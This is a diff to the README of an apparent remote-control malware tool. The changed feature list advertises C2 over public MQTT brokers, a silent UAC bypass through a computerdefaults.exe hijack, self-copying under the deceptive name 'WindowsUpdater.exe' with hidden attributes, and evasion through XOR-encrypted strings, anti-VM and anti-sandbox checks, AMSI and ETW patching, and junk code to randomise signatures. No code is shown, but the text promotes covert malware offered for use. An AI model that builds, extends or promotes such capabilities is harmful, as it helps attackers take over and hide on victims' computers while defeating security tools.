@@ -37,14 +37,17 @@
 **📡 Decentralized Communication**
 Uses public MQTT brokers (e.g., `broker.hivemq.com`) to orchestrate machines without requiring a centralized C2 server or port forwarding.
 
-**🛡️ UAC Bypass & Privilege Escalation**
-Built-in `fodhelper.exe` bypass to seamlessly elevate to **ROOT/Administrator** silently in the background. Controller UI intelligently shows ROOT status.
+**🛡️ Stealth UAC Bypass & Privilege Escalation**
+Internal stealth engine using `computerdefaults.exe` hijack. Silently elevates to **ROOT/Administrator** without spawning visible PowerShell commands or shell-based registry edits. [Read more here.](Security_Features.md#3-stealth-uac-bypass-privilege-escalation)
 
-**👻 Deep Stealth**
-Invisible background execution (No console windows).
-Copies itself to AppData under a deceptive name (`WindowsUpdater.exe`).
-Native `System` and `Hidden` file attributes applied automatically.
-Silent PowerShell execution (`$ProgressPreference = 'SilentlyContinue'`).
+**👻 Deep Stealth & Evasion**
+- XOR-encrypted strings for all sensitive identifiers (API names, paths, URLs).
+- Anti-VM, Anti-Sandbox, and Analysis detection (MAC, BIOS, WMI, Process).
+- 20-second startup stall to bypass quick sandbox analysis.
+- AMSI and ETW runtime patching / bypass.
+- Junk code injection for hash and signature randomization.
+- Invisible background execution with deceptive naming (`WindowsUpdater.exe`).
+- Native `System` and `Hidden` file attributes.
 
 **📊 Real-time System Analytics**
 Visual live-updating UI (using WinForms overlaid on the CLI) for tracking CPU, RAM, Upload, and Download speeds.
@@ -102,8 +105,8 @@ dotnet publish -c Release --runtime win-x64 --self-contained true -p:PublishSing
 
 ---
 
-### 🛡️ Future Updates
-**I would suggest adding antiVM and better anti-AV features. I will bring these in the future as updates.**
+### 🛡️ Security Analysis
+**Detailed documentation on the integrated Anti-VM, Anti-AV, and Stealth mechanisms can be found in the [Security Features Guide](Security_Features.md).**
 
 <br />
 
